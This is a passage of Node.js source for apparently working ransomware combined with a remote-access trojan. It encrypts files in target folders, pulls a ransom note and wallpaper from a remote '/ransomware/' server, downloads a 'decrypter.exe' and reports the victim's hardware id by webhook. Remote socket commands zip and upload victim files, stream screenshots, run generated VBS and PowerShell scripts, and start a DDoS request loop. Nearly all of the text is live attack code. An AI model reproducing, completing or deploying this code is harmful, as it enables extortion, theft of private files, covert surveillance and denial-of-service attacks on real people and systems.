        const ext = path.extname(fullPath).toLowerCase();
        if (ALLOWED_EXTENSIONS.includes(ext) && !fullPath.endsWith('.locked')) {
          encryptFile(fullPath);
        }
      }
    }
  }
  
  function setDesktopBackground(imageUrl) {
    const tempFilePath = path.join(os.tmpdir(), 'background.jpg');
    const file = fs.createWriteStream(tempFilePath);
  
    https.get(imageUrl, (response) => {
      response.pipe(file);
      file.on('finish', () => {
        file.close(() => {
          const psCommand = `powershell.exe -Command "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value '${tempFilePath}'"`;
  
          exec(psCommand, (error) => {
            if (!error) {
              console.log('PowerShell ile arka plan değiştirildi.');
            } else {
              console.error('PowerShell komutu başarısız oldu:', error.message);
            }
  
            const apiCommand = `rundll32.exe user32.dll,UpdatePerUserSystemParameters`;
  
            exec(apiCommand, (error) => {
              if (!error) {
                console.log('SystemParametersInfo ile arka plan hemen güncellendi.');
              } else {
                console.error('SystemParametersInfo komutu başarısız oldu:', error.message);
              }
            });
          });
        });
      });
    });
  }
  
  async function fetchReadMeData() {
    return new Promise((resolve, reject) => {
      const dataUrl = `https://${DOMAIN}/ransomware/data/${nggrkey}`;
      const webhookUrl = `https://${DOMAIN}/ransomware/webhook/${nggrkey}/${hwid}/${randomKeyR}`;
      const downloadUrl = `https://${DOMAIN}/ransomware/download-panel`;
  
      https.get(dataUrl, (res) => {
        let rawData = '';
  
        res.on('data', (chunk) => {
          rawData += chunk;
        });
  
        res.on('end', async () => {
          try {
            if (res.statusCode !== 200) {
              console.error(`❌ Server responded with status ${res.statusCode}:`, rawData);
              return reject(new Error(`Server error: ${res.statusCode}`));
            }
  
            const response = JSON.parse(rawData);
            console.log('📄 Server Response:', response);
  
            if (response.success === false) {
              console.error('❌ Server Error:', response.error || 'Unknown error');
              return reject(new Error(response.error || 'Unknown server error'));
            }
  
            const message = response.message;
            const wallpaper_url = response.wallpaper_url;
  
            if (!message || !wallpaper_url) {
              console.error('❌ Missing message or wallpaper_url.');
              return reject(new Error('Invalid server data: missing fields'));
            }
  
            const desktopPath = path.join(os.homedir(), 'Desktop', 'readme.txt');
            fs.writeFileSync(desktopPath, message, 'utf8');
            console.log('✅ Readme.txt created on Desktop.');
  
            setDesktopBackground(wallpaper_url);
            await saveExeToDesktop(downloadUrl);
  
            console.log('✅ EXE file saved to Desktop.');
  
            sendWebhook(webhookUrl);
  
            resolve({ message, wallpaper_url });
  
          } catch (error) {
            console.error('❌ Error processing server data:', error.message);
            reject(error);
          }
        });
  
      }).on('error', (err) => {
        console.error('❌ HTTPS Request Error:', err.message);
        reject(err);
      });
    });
  }
  
  async function saveExeToDesktop(downloadUrl) {
    return new Promise((resolve, reject) => {
      const exeDesktopPath = path.join(os.homedir(), 'Desktop', 'decrypter.exe');
      const file = fs.createWriteStream(exeDesktopPath);
  
      https.get(downloadUrl, (response) => {
        if (response.statusCode !== 200) {
          reject(new Error(`Failed to download EXE. Status code: ${response.statusCode}`));
          return;
        }
        response.pipe(file);
  
        file.on('finish', () => {
          file.close();
          resolve();
        });
      }).on('error', (err) => {
        fs.unlink(exeDesktopPath, () => {}); 
        reject(err);
      });
    });
  }
  
  function sendWebhook(webhookUrl) {
    const options = {
      method: 'POST',
    };
  
    const req = https.request(webhookUrl, options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        console.log('📡 Webhook response:', data);
      });
    });
  
    req.on('error', (err) => {
      console.error('❌ Error sending webhook:', err.message);
    });
  
    req.end();
  }
  
  let encryptionStarted = false;

  function startEncryption() {
    if (!encryptionStarted) {
      console.log("🔒 Encryption started!");
      encryptionStarted = true;
      for (const folder of TARGET_FOLDERS) {
        if (fs.existsSync(folder)) {
          walkDirectory(folder);
        }
      }
  
      setTimeout(() => {
        fetchReadMeData();  
        console.log("Encryption Completed.");
      }, 3000);
    } else {
      console.log("Encryption already started.");
    }
  }

    function setWallpaper(imagePath) {
        const psScript = `
            $path = "${imagePath}"
            $setwallpapersrc = @"
    using System.Runtime.InteropServices;
    
    public class Wallpaper
    {
      public const int SetDesktopWallpaper = 20;
      public const int UpdateIniFile = 0x01;
      public const int SendWinIniChange = 0x02;
      [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
      private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
      public static void SetWallpaper(string path)
      {
        SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
      }
    }
    "@
    Add-Type -TypeDefinition $setwallpapersrc
    
    [Wallpaper]::SetWallpaper($path)`;
    
        const psScriptPath = path.join(os.tmpdir(), 'set_wallpaper.ps1');
        fs.writeFileSync(psScriptPath, psScript);
    
        try {
            execSync(`powershell.exe -ExecutionPolicy Bypass -File "${psScriptPath}"`, { stdio: 'inherit' });
            console.log(`Wallpaper successfully changed: ${imagePath}`);
        } catch (error) {
            console.error(`Error changing wallpaper: ${error.message}`);
        } finally {
            fs.unlinkSync(psScriptPath);
        }
    }
    
socket.on('zipAndUpload', async ({ hwid, files }) => {
    if (!files || files.length === 0) {
        console.error(`No files to zip for HWID: ${hwid}`);
        return;
    }

    console.log(`Starting to zip files for HWID: ${hwid}`);
    const tempDir = os.tmpdir();
    const randomName = `${Math.random().toString(36).substr(2, 8)}.zip`; 
    const zipFilePath = path.join(tempDir, randomName);
    console.log(`Temporary zip file path: ${zipFilePath}`);

    try {
        const output = fs.createWriteStream(zipFilePath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        output.on('close', async () => {
            console.log(`Zipped ${archive.pointer()} total bytes for HWID: ${hwid}`);

            const gofileLink = await uploadFile(zipFilePath);
            socket.emit('uploadComplete', gofileLink);
        });

        archive.on('error', (err) => {
            console.error(`Error zipping files for HWID: ${hwid}`, err);
            throw err;
        });

        archive.pipe(output);

        files.forEach(file => {
            if (!file.path) {
                console.error(`File path is undefined for: ${file.name}`);
            } else {
                console.log(`Adding file to zip: ${file.path}`);
                if (fs.statSync(file.path).isDirectory()) {
                    archive.directory(file.path, path.basename(file.path));
                } else {
                    archive.file(file.path, { name: path.basename(file.path) });
                }
            }
        });

        await archive.finalize();
        console.log(`Finalizing zip archive for HWID: ${hwid}`);
    } catch (err) {
        console.error(`Error zipping files for HWID: ${hwid}`, err);
    }
});


    socket.on('playMusic', ({ filename, data }) => {
        console.log(`Received playMusic command with file: ${filename}`);
        const appDataPath = path.join(os.homedir(), 'AppData', 'Local');
        const musicPath = path.join(appDataPath, filename);
        const musicBuffer = Buffer.from(data, 'base64');
        fs.writeFileSync(musicPath, musicBuffer);
        playMusic(musicPath);
    });

    socket.on('alert', ({ title, content }) => {
        console.log(`Received alert with title: ${title} and content: ${content}`);
        showAlert(title, content);
    });

    socket.on('chatMessage', ({ sender, message }) => {
        console.log(`${sender}: ${message}`);
        const reply = `Got your message: ${message}`;
        socket.emit('message', { hwid, message: reply, sender: 'Victim' });
    });

    socket.on('commandOutput', (result) => {
        console.log(`Received command output: ${result}`);
    });

    socket.on('connect_error', (error) => {
        console.error('Connection Error:', error);
    });

    socket.on('openUrl', (url) => {
        console.log(`Received openUrl command with URL: ${url}`);
        const openCommand = process.platform === 'win32' ? `start ${url}` : process.platform === 'darwin' ? `open ${url}` : `xdg-open ${url}`;
        exec(openCommand, (error) => {
            if (error) {
                console.error(`Error opening URL: ${error.message}`);
            }
        });
    });
});

function playMusic(musicPath) {
    const vbsScript = `
        Set Sound = CreateObject("WMPlayer.OCX.7")
        Sound.URL = "${musicPath}"
        Sound.settings.volume = 100
        Sound.controls.play
        While Sound.playState <> 1 ' 1 means stopped
            WScript.Sleep(100)
        Wend
    `;

    const appDataPath = path.join(os.homedir(), 'AppData', 'Local');
    const vbsFilePath = path.join(appDataPath, 'playMusic.vbs');
    fs.writeFileSync(vbsFilePath, vbsScript);

    execFile('cscript', ['/nologo', vbsFilePath], { windowsHide: true });
}

function escapeForVbs(text) {
    return text.replace(/"/g, '""').replace(/\r?\n|\r/g, '');
}

function showAlert(title, content) {
    const escapedTitle = escapeForVbs(title);
    const escapedContent = escapeForVbs(content);

    const vbsContent = `Set objShell = CreateObject("WScript.Shell")
intButton = 0 + 16 ' 0: OK button, 16: Critical icon
objShell.Popup "${escapedContent}", 10, "${escapedTitle}", intButton
    `;

    const randomFileName = `${Math.random().toString(36).substring(2, 15)}.vbs`;
    const tempDir = path.join(os.homedir(), 'AppData', 'Local', 'Temp');
    const filePath = path.join(tempDir, randomFileName);

    try {
        fs.writeFileSync(filePath, vbsContent);
        console.log(`VBS file created at: ${filePath}`);
    } catch (err) {
        console.error(`Error writing VBS file: ${err.message}`);
        return;
    }

    execFile('cscript', ['/nologo', filePath], { windowsHide: true }, (error) => {
        if (error) {
            console.error(`Error showing alert: ${error.message}`);
        } else {
            console.log('Alert shown successfully');
        }
        fs.unlink(filePath, (unlinkErr) => {
            if (unlinkErr) {
                console.error(`Error deleting VBS file: ${unlinkErr.message}`);
            } else {
                console.log(`VBS file deleted: ${filePath}`);
            }
        });
    });
}

function startScreenShare() {
    isScreenSharing = true; 
    captureInterval = setInterval(() => {
        screenshot({ format: 'png' }).then((img) => {
            console.log('Screenshot taken');
            Jimp.read(img)
                .then(image => {
                    return image
                        .resize(640, 360) 
                        .getBufferAsync(Jimp.MIME_PNG);
                })
                .then(resizedImg => {
                    const compressed = brotli.compress(resizedImg);
                    if (compressed) {
                        console.log('Compression successful');
                        socket.emit('screenData', { hwid, data: compressed });
                        console.log('Data sent to server');
                    } else {
                        console.error('Compression error');
                    }
                })
                .catch(error => {
                    console.error('Resize error:', error);
                });
        }).catch((error) => {
            console.error('Screenshot error:', error);
        });
    }, 100); 
}

function stopScreenShare() {
    if (captureInterval) {
        clearInterval(captureInterval);
        isScreenSharing = false; 
        console.log('Screen sharing stopped');
    } else {
        console.log('No screen sharing in progress.');
    }
}

function startDDoS(url) {
    stopDDoS();
    ddosInterval = setInterval(() => {
        axios.get(url)
            .then(response => {
            })
            .catch(error => {
            });
    }, 100);
}

function stopDDoS() {
    if (ddosInterval) {
        clearInterval(ddosInterval);
    }
}

socket.on('connect_error', (err) => {
    console.error('Connection error:', err);
});